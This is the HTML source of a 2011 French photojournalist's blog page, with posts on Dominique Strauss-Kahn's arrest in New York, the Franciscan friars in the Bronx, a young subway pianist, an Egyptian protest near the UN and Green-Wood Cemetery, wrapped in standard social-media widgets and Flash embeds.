+<p>Oui, c’est vrai que cela peut influencer le jury, en laissant peser une présomption de culpabilité sur l&rsquo;accusé. Mais pendant le procès, il ne portera pas de menottes, pour éviter cela justement.</p>
+
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D668&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+</div>
+
+<div class="meta group">
+<div class="signature">
+    <p class="author vcard">Written by <span class="fn">Edouard de Mareschal</span> <span class="edit"></span></p>
+    <p><abbr class="updated" title="2011-05-17T00:02:23">mai 17th, 2011 at 12:02  </abbr></p>
+</div>	
+<div class="tags">
+    <p>Posted in <a href="http://blog.edouarddemareschal.com/?cat=5" title="Voir tous les articles dans New York" rel="category">New York</a>,<a href="http://blog.edouarddemareschal.com/?cat=1" title="Voir tous les articles dans Non classé" rel="category">Non classé</a>,<a href="http://blog.edouarddemareschal.com/?cat=6" title="Voir tous les articles dans photos" rel="category">photos</a>,<a href="http://blog.edouarddemareschal.com/?cat=7" title="Voir tous les articles dans publications" rel="category">publications</a>,<a href="http://blog.edouarddemareschal.com/?cat=8" title="Voir tous les articles dans stage" rel="category">stage</a></p>
+    <p>Tagged with <a href="http://blog.edouarddemareschal.com/?tag=agression-sexuelle" rel="tag">agression sexuelle</a>, <a href="http://blog.edouarddemareschal.com/?tag=arrestation" rel="tag">arrestation</a>, <a href="http://blog.edouarddemareschal.com/?tag=detention-provisoire" rel="tag">détention provisoire</a>, <a href="http://blog.edouarddemareschal.com/?tag=dominique-srauss-kahn" rel="tag">Dominique Srauss-Kahn</a>, <a href="http://blog.edouarddemareschal.com/?tag=dsk" rel="tag">DSK</a>, <a href="http://blog.edouarddemareschal.com/?tag=fmi" rel="tag">FMI</a>, <a href="http://blog.edouarddemareschal.com/?tag=grand-jury" rel="tag">Grand Jury</a>, <a href="http://blog.edouarddemareschal.com/?tag=justice" rel="tag">justice</a>, <a href="http://blog.edouarddemareschal.com/?tag=matthew-j-galluzzo" rel="tag">Matthew J.Galluzzo</a>, <a href="http://blog.edouarddemareschal.com/?tag=new-york" rel="tag">New York</a>, <a href="http://blog.edouarddemareschal.com/?tag=procedure-penale-americaine" rel="tag">procédure pénale américaine</a>, <a href="http://blog.edouarddemareschal.com/?tag=rikers-island" rel="tag">Rikers Island</a>, <a href="http://blog.edouarddemareschal.com/?tag=tentative-de-viol" rel="tag">tentative de viol</a></p></div>
+</div>
+</div><!-- END .hentry -->
+
+
+
+<div class="post hentry">
+<h2 id="post-658" class="entry-title"><a href="http://blog.edouarddemareschal.com/?p=658" rel="bookmark">DSK comparaîtra lundi devant la justice américaine</a></h2>
+<p class="comments"><a href="http://blog.edouarddemareschal.com/?p=658#comments">leave a comment</a></p>
+
+<div class="main entry-content group">
+	<iframe allowtransparency="true" frameborder="0" scrolling="no" src="http://platform.twitter.com/widgets/tweet_button.html?count=none" style="width:55px; height:30px;"></iframe>
+	
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D658&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+<p>Dominique Strauss-Kahn, le directeur général du Fonds Monétaire International, <a href="http://www.lemonde.fr/politique/article/2011/05/15/en-direct-les-suites-de-l-arrestation-de-dsk_1522335_823448.html#ens_id=1522342">a quitté</a> dimanche soir le commissariat de Harlem menottes aux poignets aux alentours de 23 heures (heure de New York). Il y était interrogé par la police depuis samedi après-midi.</p>
+<p>Vers 22h30 (heure de New York), ses deux avocats William Taylor et Benjamin Brafman ont tenu une très courte conférence de presse devant le tribunal. Ils ont indiqué que leur client avait consenti « à faire de nouveaux examens ADN demandés par le gouvernement ». Selon eux, le président du FMI devrait comparaître demain lundi devant le tribunal, à partir de 11 heures (heure de New York).</p>
+<p><img class="aligncenter size-full wp-image-662" title="point presse" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/05/point-presse.jpg" alt="" width="716" height="480" /></p>
+<p><object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="100%" height="81" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0"><param name="allowscriptaccess" value="always" /><param name="src" value="http://player.soundcloud.com/player.swf?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F15340205" /><embed type="application/x-shockwave-flash" width="100%" height="81" src="http://player.soundcloud.com/player.swf?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F15340205" allowscriptaccess="always"></embed></object> <span><a href="http://soundcloud.com/leab/conf-rence-de-presse-des-deux">Conférence de presse des deux avocats de Dominique Strauss-Kahn- 15mai2011</a> by <a href="http://soundcloud.com/leab">LéaB</a></span></p>
+<p>Cette conférence mettait fin à une longue journée d’attente, où les informations contradictoires se sont succédées. Les deux avocats du prévenu sont arrivés au tribunal à 16h30 dimanche après midi, laissant penser que Dominique Strauss-Kahn arriverait plus tard dans la soirée.</p>
+<p><img class="aligncenter size-full wp-image-660" title="Benjamin Brafman et William Taylor" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/05/Benjamin-Brafman-et-William-Taylor.jpg" alt="" width="716" height="480" /></p>
+<p>A sa sortie du commissariat, DSK a été emmené par la police vers une destination encore inconnue. Selon Reuters, il pourrait passer la nuit au dépôt du palais de justice de Manhattan ou bien dans les services médico-légaux pour y subir des examens corporels.</p>
+<p>Le directeur général du FMI a été arrêté samedi après-midi à l’aéroport JFK de New York, alors qu’il prenait un vol pour Paris. Il est accusé d&rsquo;acte sexuel criminel, tentative de viol et séquestration. Si toutes ces charges sont retenues contre lui, il risque jusqu’à <a href="http://www.lepoint.fr/chroniqueurs-du-point/laurence-neuer/dsk-risque-26-ans-de-prison-15-05-2011-1331000_56.php">26 ans de prison</a>.</p>
+<p><img class="aligncenter size-full wp-image-664" title="journaliste après conf de presse" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/05/journaliste-après-conf-de-presse.jpg" alt="" width="716" height="480" /></p>
+
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D658&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+</div>
+
+<div class="meta group">
+<div class="signature">
+    <p class="author vcard">Written by <span class="fn">Edouard de Mareschal</span> <span class="edit"></span></p>
+    <p><abbr class="updated" title="2011-05-16T05:16:43">mai 16th, 2011 at 5:16  </abbr></p>
+</div>	
+<div class="tags">
+    <p>Posted in <a href="http://blog.edouarddemareschal.com/?cat=5" title="Voir tous les articles dans New York" rel="category">New York</a>,<a href="http://blog.edouarddemareschal.com/?cat=1" title="Voir tous les articles dans Non classé" rel="category">Non classé</a>,<a href="http://blog.edouarddemareschal.com/?cat=6" title="Voir tous les articles dans photos" rel="category">photos</a></p>
+    <p>Tagged with <a href="http://blog.edouarddemareschal.com/?tag=agression-sexuelle" rel="tag">agression sexuelle</a>, <a href="http://blog.edouarddemareschal.com/?tag=arrestation" rel="tag">arrestation</a>, <a href="http://blog.edouarddemareschal.com/?tag=detention-provisoire" rel="tag">détention provisoire</a>, <a href="http://blog.edouarddemareschal.com/?tag=dominique-srauss-kahn" rel="tag">Dominique Srauss-Kahn</a>, <a href="http://blog.edouarddemareschal.com/?tag=dsk" rel="tag">DSK</a>, <a href="http://blog.edouarddemareschal.com/?tag=fmi" rel="tag">FMI</a>, <a href="http://blog.edouarddemareschal.com/?tag=grand-jury" rel="tag">Grand Jury</a>, <a href="http://blog.edouarddemareschal.com/?tag=justice" rel="tag">justice</a>, <a href="http://blog.edouarddemareschal.com/?tag=new-york" rel="tag">New York</a>, <a href="http://blog.edouarddemareschal.com/?tag=rikers-island" rel="tag">Rikers Island</a>, <a href="http://blog.edouarddemareschal.com/?tag=tentative-de-viol" rel="tag">tentative de viol</a></p></div>
+</div>
+</div><!-- END .hentry -->
+
+
+
+<div class="post hentry">
+<h2 id="post-657" class="entry-title"><a href="http://blog.edouarddemareschal.com/?p=657" rel="bookmark">Midnight Run With Franciscan Friars of the Renewal</a></h2>
+<p class="comments"><a href="http://blog.edouarddemareschal.com/?p=657#comments">3 comments</a></p>
+
+<div class="main entry-content group">
+	<iframe allowtransparency="true" frameborder="0" scrolling="no" src="http://platform.twitter.com/widgets/tweet_button.html?count=none" style="width:55px; height:30px;"></iframe>
+	
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D657&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+<p><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="800" height="575" id="soundslider"><param name="movie" value="http://edouarddemareschal.com/soundslides/friars_of_the_renewal__Bronx/soundslider.swf?size=2&#038;format=xml&#038;embed_width=800&#038;embed_height=575" /><param name="allowScriptAccess" value="always" /><param name="quality" value="high" /><param name="allowFullScreen" value="true" /><param name="menu" value="false" /><param name="bgcolor" value="#FFFFFF" /><embed src="http://edouarddemareschal.com/soundslides/friars_of_the_renewal__Bronx/soundslider.swf?size=2&#038;format=xml&#038;embed_width=800&#038;embed_height=575" quality="high" bgcolor="#FFFFFF" width="800" height="575" menu="false" allowScriptAccess="sameDomain" allowFullScreen="true" type="application/x-shockwave-flash"></embed></object></p>
+<p>Premier essai</p>
+<p><object id="soundslider" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="800" height="550" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0"><param name="allowScriptAccess" value="always" /><param name="quality" value="high" /><param name="allowFullScreen" value="true" /><param name="menu" value="false" /><param name="bgcolor" value="#FFFFFF" /><param name="src" value="http://edouarddemareschal.com/soundslides/midnight_run_franciscan_friars/soundslider.swf?size=2&amp;format=xml&amp;embed_width=800&amp;embed_height=550" /><param name="allowfullscreen" value="true" /><embed id="soundslider" type="application/x-shockwave-flash" width="800" height="550" src="http://edouarddemareschal.com/soundslides/midnight_run_franciscan_friars/soundslider.swf?size=2&amp;format=xml&amp;embed_width=800&amp;embed_height=550" bgcolor="#FFFFFF" menu="false" allowfullscreen="true" quality="high" allowscriptaccess="always"></embed></object></p>
+
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D657&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+</div>
+
+<div class="meta group">
+<div class="signature">
+    <p class="author vcard">Written by <span class="fn">Edouard de Mareschal</span> <span class="edit"></span></p>
+    <p><abbr class="updated" title="2011-05-09T07:41:07">mai 9th, 2011 at 7:41  </abbr></p>
+</div>	
+<div class="tags">
+    <p>Posted in <a href="http://blog.edouarddemareschal.com/?cat=2" title="Voir tous les articles dans CUNY" rel="category">CUNY</a>,<a href="http://blog.edouarddemareschal.com/?cat=3" title="Voir tous les articles dans diapos sonores" rel="category">diapos sonores</a>,<a href="http://blog.edouarddemareschal.com/?cat=5" title="Voir tous les articles dans New York" rel="category">New York</a>,<a href="http://blog.edouarddemareschal.com/?cat=1" title="Voir tous les articles dans Non classé" rel="category">Non classé</a>,<a href="http://blog.edouarddemareschal.com/?cat=6" title="Voir tous les articles dans photos" rel="category">photos</a></p>
+    </div>
+</div>
+</div><!-- END .hentry -->
+
+
+
+<div class="post hentry">
+<h2 id="post-640" class="entry-title"><a href="http://blog.edouarddemareschal.com/?p=640" rel="bookmark">From Ash Wednesday to Easter</a></h2>
+<p class="comments"><a href="http://blog.edouarddemareschal.com/?p=640#comments">leave a comment</a></p>
+
+<div class="main entry-content group">
+	<iframe allowtransparency="true" frameborder="0" scrolling="no" src="http://platform.twitter.com/widgets/tweet_button.html?count=none" style="width:55px; height:30px;"></iframe>
+	
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D640&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+<p>The Franciscan Friars of the Renewal organized a Stations of the Cross, last Wednesday in the Bronx, with people they host in two shelters next to their convent.</p>
+<p>Ash Wednesday marks the first day of Lent for Christians. Faithfuls are imposed ashes on the forehead, as a sign of repentance and humility before God. When applying the ashes, the priest says: &laquo;&nbsp;Remember, Man is dust, and unto dust you shall return.&nbsp;&raquo;</p>
+<p>During the forty days of lent, Christians are going to prepare themselves to Easter, the most important liturgical feast of the year where they celebrate the resurrection of Jesus.</p>
+<p><img class="aligncenter size-full wp-image-644" title="_DSC0005 copy" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/03/DSC0005-copy.jpg" alt="" width="716" height="480" />.</p>
+<p><img class="aligncenter size-full wp-image-643" title="_DSC0014 copy" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/03/DSC0014-copy.jpg" alt="" width="716" height="480" />.</p>
+<p><img class="aligncenter size-full wp-image-646" title="_DSC0016 copy" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/03/DSC0016-copy.jpg" alt="" width="716" height="480" />.</p>
+<p><img class="aligncenter size-full wp-image-642" title="_DSC0027 copy" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/03/DSC0027-copy.jpg" alt="" width="716" height="480" />.</p>
+<p><img class="aligncenter size-full wp-image-641" title="_DSC0030 copy" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/03/DSC0030-copy.jpg" alt="" width="716" height="480" /></p>
+
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D640&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+</div>
+
+<div class="meta group">
+<div class="signature">
+    <p class="author vcard">Written by <span class="fn">Edouard de Mareschal</span> <span class="edit"></span></p>
+    <p><abbr class="updated" title="2011-03-11T05:48:51">mars 11th, 2011 at 5:48  </abbr></p>
+</div>	
+<div class="tags">
+    <p>Posted in <a href="http://blog.edouarddemareschal.com/?cat=5" title="Voir tous les articles dans New York" rel="category">New York</a>,<a href="http://blog.edouarddemareschal.com/?cat=1" title="Voir tous les articles dans Non classé" rel="category">Non classé</a>,<a href="http://blog.edouarddemareschal.com/?cat=6" title="Voir tous les articles dans photos" rel="category">photos</a></p>
+    <p>Tagged with <a href="http://blog.edouarddemareschal.com/?tag=ash-wednesday" rel="tag">ash wednesday</a>, <a href="http://blog.edouarddemareschal.com/?tag=bronx" rel="tag">bronx</a>, <a href="http://blog.edouarddemareschal.com/?tag=franciscan-friars-of-the-renewal" rel="tag">franciscan friars of the renewal</a>, <a href="http://blog.edouarddemareschal.com/?tag=lent" rel="tag">lent</a>, <a href="http://blog.edouarddemareschal.com/?tag=new-york" rel="tag">New York</a>, <a href="http://blog.edouarddemareschal.com/?tag=stations-of-the-cross" rel="tag">stations of the cross</a></p></div>
+</div>
+</div><!-- END .hentry -->
+
+
+
+<div class="post hentry">
+<h2 id="post-631" class="entry-title"><a href="http://blog.edouarddemareschal.com/?p=631" rel="bookmark">Gifted Child</a></h2>
+<p class="comments"><a href="http://blog.edouarddemareschal.com/?p=631#comments">leave a comment</a></p>
+
+<div class="main entry-content group">
+	<iframe allowtransparency="true" frameborder="0" scrolling="no" src="http://platform.twitter.com/widgets/tweet_button.html?count=none" style="width:55px; height:30px;"></iframe>
+	
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D631&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+<p><img class="aligncenter size-full wp-image-630" title="_DSC0134 web" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/02/DSC0134-web.jpg" alt="" width="716" height="480" /></p>
+<p>Jason W.Cordero, 13, has been playing piano for five years. Almost every  weekend, he performs in the metro accompanied by his father  (on the  left).</p>
+
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D631&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+</div>
+
+<div class="meta group">
+<div class="signature">
+    <p class="author vcard">Written by <span class="fn">Edouard de Mareschal</span> <span class="edit"></span></p>
+    <p><abbr class="updated" title="2011-02-11T05:52:57">février 11th, 2011 at 5:52  </abbr></p>
+</div>	
+<div class="tags">
+    <p>Posted in <a href="http://blog.edouarddemareschal.com/?cat=5" title="Voir tous les articles dans New York" rel="category">New York</a>,<a href="http://blog.edouarddemareschal.com/?cat=1" title="Voir tous les articles dans Non classé" rel="category">Non classé</a>,<a href="http://blog.edouarddemareschal.com/?cat=6" title="Voir tous les articles dans photos" rel="category">photos</a></p>
+    <p>Tagged with <a href="http://blog.edouarddemareschal.com/?tag=gifted" rel="tag">gifted</a>, <a href="http://blog.edouarddemareschal.com/?tag=jason-w-cordero" rel="tag">Jason W.Cordero</a>, <a href="http://blog.edouarddemareschal.com/?tag=manhattan" rel="tag">Manhattan</a>, <a href="http://blog.edouarddemareschal.com/?tag=new-york" rel="tag">New York</a>, <a href="http://blog.edouarddemareschal.com/?tag=pianist" rel="tag">pianist</a>, <a href="http://blog.edouarddemareschal.com/?tag=times-square" rel="tag">Times square</a>, <a href="http://blog.edouarddemareschal.com/?tag=young" rel="tag">young</a></p></div>
+</div>
+</div><!-- END .hentry -->
+
+
+
+<div class="post hentry">
+<h2 id="post-617" class="entry-title"><a href="http://blog.edouarddemareschal.com/?p=617" rel="bookmark">Egyptian protest near U.N.</a></h2>
+<p class="comments"><a href="http://blog.edouarddemareschal.com/?p=617#comments">one comment</a></p>
+
+<div class="main entry-content group">
+	<iframe allowtransparency="true" frameborder="0" scrolling="no" src="http://platform.twitter.com/widgets/tweet_button.html?count=none" style="width:55px; height:30px;"></iframe>
+	
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D617&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+<p style="text-align: justify;">&laquo;&nbsp;Several hundred people gathered on Saturday afternoon near the United  Nations for a demonstration in support of the recent antigovernment  protesters in Egypt. Participants came from New York City and beyond,  buoyed, they said, by the hope that a wave of clashes taking pace in  Egyptian cities over the last few days might sweep Mr. Mubarak from  office and usher in democratic reforms.&nbsp;&raquo; &#8230;<strong><a href="http://cityroom.blogs.nytimes.com/2011/01/29/egyptian-protests-extend-to-streets-of-new-york/?partner=rss&amp;emc=rss" target="_blank">Egyptian Protests Extend to Streets of New York</a> </strong><span style="color: #000000;">, by COLIN MOYNIHAN, New York Times<br />
+</span></p>
+<p><img class="aligncenter size-full wp-image-618" title="_DSC0267 copy" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/01/DSC0267-copy.jpg" alt="" width="716" height="480" />.</p>
+<p><img class="aligncenter size-full wp-image-619" title="_DSC0226 copy" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/01/DSC0226-copy.jpg" alt="" width="716" height="480" />.</p>
+<p><img class="aligncenter size-full wp-image-622" title="_DSC0186 copy" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/01/DSC0186-copy.jpg" alt="" width="716" height="480" /></p>
+
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D617&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+</div>
+
+<div class="meta group">
+<div class="signature">
+    <p class="author vcard">Written by <span class="fn">Edouard de Mareschal</span> <span class="edit"></span></p>
+    <p><abbr class="updated" title="2011-01-30T03:57:29">janvier 30th, 2011 at 3:57  </abbr></p>
+</div>	
+<div class="tags">
+    <p>Posted in <a href="http://blog.edouarddemareschal.com/?cat=5" title="Voir tous les articles dans New York" rel="category">New York</a>,<a href="http://blog.edouarddemareschal.com/?cat=1" title="Voir tous les articles dans Non classé" rel="category">Non classé</a>,<a href="http://blog.edouarddemareschal.com/?cat=6" title="Voir tous les articles dans photos" rel="category">photos</a></p>
+    <p>Tagged with <a href="http://blog.edouarddemareschal.com/?tag=egypt" rel="tag">Egypt</a>, <a href="http://blog.edouarddemareschal.com/?tag=egyptian" rel="tag">Egyptian</a>, <a href="http://blog.edouarddemareschal.com/?tag=protest" rel="tag">protest</a>, <a href="http://blog.edouarddemareschal.com/?tag=un" rel="tag">UN</a>, <a href="http://blog.edouarddemareschal.com/?tag=united-nations" rel="tag">United Nations</a></p></div>
+</div>
+</div><!-- END .hentry -->
+
+
+
+<div class="post hentry">
+<h2 id="post-606" class="entry-title"><a href="http://blog.edouarddemareschal.com/?p=606" rel="bookmark">Green-Wood Cemetery</a></h2>
+<p class="comments"><a href="http://blog.edouarddemareschal.com/?p=606#comments">one comment</a></p>
+
+<div class="main entry-content group">
+	<iframe allowtransparency="true" frameborder="0" scrolling="no" src="http://platform.twitter.com/widgets/tweet_button.html?count=none" style="width:55px; height:30px;"></iframe>
+	
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D606&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+<p><a href="http://blog.edouarddemareschal.com/wp-content/uploads/2011/01/DSC0132-web.jpg"><br />
+</a><img class="aligncenter size-full wp-image-608" title="_DSC0132 web" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/01/DSC0132-web.jpg" alt="" width="716" height="480" />.</p>
+<p><img class="aligncenter size-full wp-image-609" title="_DSC0157 web" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/01/DSC0157-web.jpg" alt="" width="716" height="480" />.</p>
+<p><img title="_DSC0115 web" src="http://blog.edouarddemareschal.com/wp-content/uploads/2011/01/DSC0115-web.jpg" alt="" width="716" height="480" /></p>
+
+<!-- Facebook Like Button v1.9.6 BEGIN [http://blog.bottomlessinc.com] -->
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fblog.edouarddemareschal.com%2F%3Fp%3D606&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;colorscheme=light" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:450px; height: 30px; align: left; margin: 2px 0px 2px 0px"></iframe>
+<!-- Facebook Like Button END -->
+</div>
+
+<div class="meta group">
+<div class="signature">
+    <p class="author vcard">Written by <span class="fn">Edouard de Mareschal</span> <span class="edit"></span></p>
+    <p><abbr class="updated" title="2011-01-19T04:22:46">janvier 19th, 2011 at 4:22  </abbr></p>
+</div>	
+<div class="tags">
+    <p>Posted in <a href="http://blog.edouarddemareschal.com/?cat=5" title="Voir tous les articles dans New York" rel="category">New York</a>,<a href="http://blog.edouarddemareschal.com/?cat=1" title="Voir tous les articles dans Non classé" rel="category">Non classé</a>,<a href="http://blog.edouarddemareschal.com/?cat=6" title="Voir tous les articles dans photos" rel="category">photos</a></p>
+    <p>Tagged with <a href="http://blog.edouarddemareschal.com/?tag=brooklyn" rel="tag">Brooklyn</a>, <a href="http://blog.edouarddemareschal.com/?tag=green-wood-cemetery" rel="tag">Green Wood Cemetery</a>, <a href="http://blog.edouarddemareschal.com/?tag=greenwood-heights" rel="tag">Greenwood Heights</a>, <a href="http://blog.edouarddemareschal.com/?tag=new-york" rel="tag">New York</a>, <a href="http://blog.edouarddemareschal.com/?tag=park-slope" rel="tag">Park Slope</a>, <a href="http://blog.edouarddemareschal.com/?tag=prospect-park" rel="tag">Prospect Park</a>, <a href="http://blog.edouarddemareschal.com/?tag=sunset-park" rel="tag">Sunset Park</a>, <a href="http://blog.edouarddemareschal.com/?tag=windsor-terrace" rel="tag">Windsor Terrace</a>, <a href="http://blog.edouarddemareschal.com/?tag=winter" rel="tag">winter</a></p></div>
+</div>
+</div><!-- END .hentry -->
+
+
+
+<div class="navigation group">
+	<div class="alignleft"><a href="http://blog.edouarddemareschal.com/?paged=2" >&laquo; Older Entries</a></div>
+	<div class="alignright"></div>
+</div>
+
+</div> 
+
+<div id="sidebar">
+<form role="search" method="get" id="searchform" class="searchform" action="http://blog.edouarddemareschal.com/">
+				<div>
+					<label class="screen-reader-text" for="s">Recherche pour&nbsp;:</label>
+					<input type="text" value="" name="s" id="s" />
+					<input type="submit" id="searchsubmit" value="Rechercher" />
+				</div>
+			</form>				<h3>Articles récents</h3>		<ul>
+					<li>
+				<a href="http://blog.edouarddemareschal.com/?p=810" title="Je t&rsquo;aime moi non plus">Je t&rsquo;aime moi non plus</a>
+						</li>
+					<li>
+				<a href="http://blog.edouarddemareschal.com/?p=749" title="DSK plaide non coupable lors d’une comparution aussi rapide que sur-médiatisée">DSK plaide non coupable lors d’une comparution aussi rapide que sur-médiatisée</a>
+						</li>
+					<li>
+				<a href="http://blog.edouarddemareschal.com/?p=681" title="Publié sur Libé.fr &#8211; &laquo;&nbsp;Je ne fête jamais la mort de quelqu&rsquo;un. Mais pour Ben Laden, si.&nbsp;&raquo;">Publié sur Libé.fr &#8211; &laquo;&nbsp;Je ne fête jamais la mort de quelqu&rsquo;un. Mais pour Ben Laden, si.&nbsp;&raquo;</a>
+						</li>
+					<li>
+				<a href="http://blog.edouarddemareschal.com/?p=668" title="DSK en détention provisoire à New York, avant son passage devant le Grand Jury d&rsquo;ici à vendredi">DSK en détention provisoire à New York, avant son passage devant le Grand Jury d&rsquo;ici à vendredi</a>
+						</li>
+					<li>
+				<a href="http://blog.edouarddemareschal.com/?p=658" title="DSK comparaîtra lundi devant la justice américaine">DSK comparaîtra lundi devant la justice américaine</a>
+						</li>
+				</ul>
+		<h3>Commentaires récents</h3><ul id="recentcomments"><li class="recentcomments">Brian &amp; Bonnie Ludwig dans <a href="http://blog.edouarddemareschal.com/?p=657#comment-207">Midnight Run With Franciscan Friars of the Renewal</a></li><li class="recentcomments">Sunday Ruvolo dans <a href="http://blog.edouarddemareschal.com/?p=657#comment-206">Midnight Run With Franciscan Friars of the Renewal</a></li><li class="recentcomments">Brad Fischer dans <a href="http://blog.edouarddemareschal.com/?p=657#comment-205">Midnight Run With Franciscan Friars of the Renewal</a></li><li class="recentcomments"><a href='http://www.duflab.com/medias/la-revue-de-presse-complete-de-prison-valley' rel='external nofollow' class='url'>La Revue de presse complète de Prison Valley | DufLab</a> dans <a href="http://blog.edouarddemareschal.com/?p=334#comment-54">Prison Valley, Web-doc sur l&rsquo;industrie carcérale américaine</a></li><li class="recentcomments">Marien dans <a 